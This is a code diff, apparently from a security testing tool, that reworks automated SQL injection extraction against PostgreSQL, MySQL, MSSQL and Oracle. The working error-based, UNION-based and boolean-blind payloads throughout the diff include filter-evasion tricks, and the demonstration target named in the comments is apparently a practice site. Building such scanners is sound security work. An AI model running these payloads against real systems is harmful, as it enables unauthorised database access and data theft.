@@ -20,17 +20,66 @@ from collections.abc import Callable
 
 from owlforge.engine.preprobe import _send
 
-_W = "owlX7z"   # delimiter so we can find our extracted value inside a noisy error/page
+_W = "owlX7z"   # delimiter we search for in the response — EVALUATED output only (see _delim)
 _MAXLEN = 48    # cap on the blind-extracted string length (keeps the binary search bounded)
+# tokens that mean "this is our payload reflected back, not the DB's answer" — reject them
+_ECHO = ("||", "chr(", "char(", "concat(", "current_user", "current_database",
+         "@@version", "system_user", "select ", "&apos;", "&#39;", "'")
 
-# Per-dialect value expression: version + current user, concatenated read-only. The MySQL
-# form skips the wrapper because extractvalue() truncates its error to ~32 chars.
-_VAL = {
-    "postgresql": f"'{_W}'||version()||'/'||current_user||'{_W}'",
-    "mssql": f"'{_W}'+@@version+'/'+system_user+'{_W}'",
-    "mysql": "concat(0x7e,version(),0x2f,current_user())",
-    "oracle": f"'{_W}'||(select banner from v$version where rownum=1)||'{_W}'",
-}
+
+def _delim(dialect: str) -> str:
+    """Build the delimiter from chr()/char() so the LITERAL payload never contains the
+    delimiter string `_W` — only the DB *evaluating* it produces `_W`. Without this, an app
+    that reflects the input parameter (ginandjuice echoes `category`) makes the raw payload
+    match our wrapper and we extract our own payload text instead of the database's answer."""
+    codes = [ord(c) for c in _W]
+    if dialect == "mysql":
+        return "char(" + ",".join(str(c) for c in codes) + ")"
+    if dialect == "mssql":
+        return "+".join(f"char({c})" for c in codes)
+    return "||".join(f"chr({c})" for c in codes)   # postgresql / oracle
+
+
+def _wrap(dialect: str, inner: str) -> str:
+    d = _delim(dialect)
+    if dialect == "mysql":
+        return f"concat({d},{inner},{d})"
+    if dialect == "mssql":
+        return f"{d}+{inner}+{d}"
+    return f"{d}||{inner}||{d}"
+
+
+def _clean(val: str | None) -> str | None:
+    """Reject an 'extracted' string that is really our payload reflected back."""
+    if not val or len(val) < 3:
+        return None
+    low = val.lower()
+    return None if any(tok in low for tok in _ECHO) else val
+
+# Read-only, low-sensitivity values to extract, best-first. We try several because a target
+# may FILTER a keyword (ginandjuice strips "version"/"database", leaving malformed SQL) or run
+# a dialect where one is absent — whichever the target actually accepts yields the proof.
+# `current_user` has no parens/filtered-words and survives most naive blocklists.
+_VALUE_EXPRS = [
+    ("version", "version()"),
+    ("current_user", "current_user"),
+    ("session_user", "session_user"),
+    ("current_db", "current_database()"),
+    ("mssql_version", "@@version"),
+    ("oracle_banner", "(select banner from v$version where rownum=1)"),
+]
+
+# (dialect, inner read-only value expr), best-first. version() first; current_user is the
+# filter-resilient fallback (no parens / filtered keywords).
+_DIALECT_INNERS = [
+    ("postgresql", "version()||chr(47)||current_user"),
+    ("postgresql", "current_user"),
+    ("mysql", "concat(version(),0x2f,current_user())"),
+    ("mysql", "current_user()"),
+    ("mssql", "@@version+char(47)+system_user"),
+    ("mssql", "system_user"),
+    ("oracle", "(select banner from v$version where rownum=1)"),
+]
 # Per-dialect "force the value into a type-conversion error" wrapper.
 _ERR = {
     "postgresql": lambda v: f"cast(({v}) as int)",
@@ -57,11 +106,12 @@ def _find_wrapped(body: str, dialect: str) -> str | None:
 
 
 def _error_based(sandbox, t, and_pre, suf, headers) -> tuple[str | None, str]:
-    for dialect, expr in _VAL.items():
-        payload = f"{and_pre} AND {_ERR[dialect](expr)}{suf}"
+    for dialect, inner in _DIALECT_INNERS:
+        wrapped = f"concat(0x7e,{inner})" if dialect == "mysql" else _wrap(dialect, inner)
+        payload = f"{and_pre} AND {_ERR[dialect](wrapped)}{suf}"
         _st, body = _resp(sandbox, t, payload, headers)
-        val = _find_wrapped(body, dialect)
-        if val and len(val) >= 3:
+        val = _clean(_find_wrapped(body, dialect))
+        if val:
             return val, f"error-based/{dialect}"
     return None, ""
 
@@ -79,71 +129,75 @@ def _union_based(sandbox, t, union_pre, suf, headers) -> tuple[str | None, str]:
             break
     if not ncols:
         return None, ""
-    # 2) drop the wrapped value into one column at a time until it echoes in the body
-    val_exprs = (
-        ("postgresql", f"'{_W}'||version()||'/'||current_user||'{_W}'"),
-        ("mysql", f"concat('{_W}',version(),0x2f,current_user(),'{_W}')"),
-        ("mssql", f"'{_W}'+@@version+'/'+system_user+'{_W}'"),
-    )
+    # 2) drop a chr()-wrapped value into one column at a time until it echoes. Several value
+    #    forms so a keyword filter (ginandjuice strips "version") or wrong dialect still yields
+    #    one — current_user survives most naive blocklists. The chr() delimiter means a
+    #    REFLECTED copy of the payload cannot match our wrapper; only EVALUATED output does.
     for col in range(ncols):
-        for dial, valexpr in val_exprs:
+        for dialect, inner in _DIALECT_INNERS:
             slot = ["NULL"] * ncols
-            slot[col] = valexpr
+            slot[col] = _wrap(dialect, inner)
             _st, body = _resp(sandbox, t, f"{union_pre} UNION SELECT {','.join(slot)}{suf}", headers)
-            val = _find_wrapped(body, "")
-            if val and len(val) >= 3:
-                return val, f"union-based ({ncols} cols, col {col + 1}, {dial})"
+            val = _clean(_find_wrapped(body, ""))
+            if val:
+                return val, f"union-based ({ncols} cols, col {col + 1}, {dialect})"
     return None, ""
-
-
-def _sig(status: int, body: str) -> tuple[int, int]:
-    """A coarse, stable response signature for the boolean oracle (status + length bucket)."""
-    return status, len(body) // 32
 
 
 def _boolean_blind(sandbox, t, and_pre, suf, headers) -> tuple[str | None, str]:
     # Primary oracle: a CONDITIONAL ERROR — a false condition forces divide-by-zero, so the
     # response flips 200<->500 regardless of whether the injected value is a "valid" one.
-    # This is value-agnostic, unlike comparing content length for a made-up base value (the
-    # reason blind extraction missed the ginandjuice `category` SQLi, where `category=1` is
-    # not a real category so true/false looked identical). 1/0 errors on PG/MySQL/MSSQL/Oracle.
+    # Value-agnostic, and compared on STATUS ONLY: page bodies jitter by more than any fixed
+    # length bucket between requests (dynamic markup), so a length-bucket oracle gives a
+    # different signature for two genuinely-true responses and silently fails — the real
+    # reason the first live ginandjuice extraction came back empty.
     def _cond(c: str) -> str:
         return f"{and_pre} AND 1/(case when ({c}) then 1 else 0 end)=1{suf}"
 
-    t_sig = _sig(*_resp(sandbox, t, _cond("1=1"), headers))
-    f_sig = _sig(*_resp(sandbox, t, _cond("1=2"), headers))
-    if t_sig != f_sig:
+    t_st, _tb = _resp(sandbox, t, _cond("1=1"), headers)
+    f_st, _fb = _resp(sandbox, t, _cond("1=2"), headers)
+    if t_st and f_st and t_st != f_st:
         how = "boolean-blind (conditional error)"
 
         def truth(c: str) -> bool:
-            return _sig(*_resp(sandbox, t, _cond(c), headers)) == t_sig
+            return _resp(sandbox, t, _cond(c), headers)[0] == t_st
     else:
         # Fallback: a plain content-difference oracle (apps that show/hide rows, no error).
-        tt = _sig(*_resp(sandbox, t, f"{and_pre} AND 1=1{suf}", headers))
-        ff = _sig(*_resp(sandbox, t, f"{and_pre} AND 1=2{suf}", headers))
-        if tt == ff:
-            return None, ""
+        tt_st, tt_b = _resp(sandbox, t, f"{and_pre} AND 1=1{suf}", headers)
+        ff_st, ff_b = _resp(sandbox, t, f"{and_pre} AND 1=2{suf}", headers)
         how = "boolean-blind"
+        if tt_st and ff_st and tt_st != ff_st:         # status distinguishes
+            def truth(c: str) -> bool:
+                return _resp(sandbox, t, f"{and_pre} AND {c}{suf}", headers)[0] == tt_st
+        elif abs(len(tt_b) - len(ff_b)) > 50:          # length distinguishes (nearest-match)
+            tl, fl = len(tt_b), len(ff_b)
 
-        def truth(c: str) -> bool:
-            return _sig(*_resp(sandbox, t, f"{and_pre} AND {c}{suf}", headers)) == tt
+            def truth(c: str) -> bool:
+                n = len(_resp(sandbox, t, f"{and_pre} AND {c}{suf}", headers)[1])
+                return abs(n - tl) <= abs(n - fl)
+        else:
+            return None, ""
 
-    sub = "substring((select version()),{i},1)"   # MySQL/Postgres/MSSQL; Oracle lacks version()
-    out = []
-    for i in range(1, _MAXLEN + 1):
-        if not truth(f"length((select version()))>={i}"):
-            break
-        lo, hi = 32, 126
-        while lo < hi:
-            mid = (lo + hi) // 2
-            if truth(f"ascii({sub.format(i=i)})>{mid}"):
-                lo = mid + 1
-            else:
-                hi = mid
-        out.append(chr(lo))
-    val = "".join(out).strip()
-    if len(val) >= 3:
-        return val, how
+    # Try each candidate value; extract the first the target actually accepts (not filtered,
+    # not null). This is what makes it robust to keyword filters and dialect differences.
+    for label, expr in _VALUE_EXPRS:
+        if not truth(f"length(({expr}))>=1"):
+            continue   # filtered out (malformed -> error) or null -> next candidate
+        out = []
+        for i in range(1, _MAXLEN + 1):
+            if not truth(f"length(({expr}))>={i}"):
+                break
+            lo, hi = 32, 126
+            while lo < hi:
+                mid = (lo + hi) // 2
+                if truth(f"ascii(substring(({expr}),{i},1))>{mid}"):
+                    lo = mid + 1
+                else:
+                    hi = mid
+            out.append(chr(lo))
+        val = "".join(out).strip()
+        if len(val) >= 3:
+            return val, f"{how} via {label}"
     return None, ""
 
 
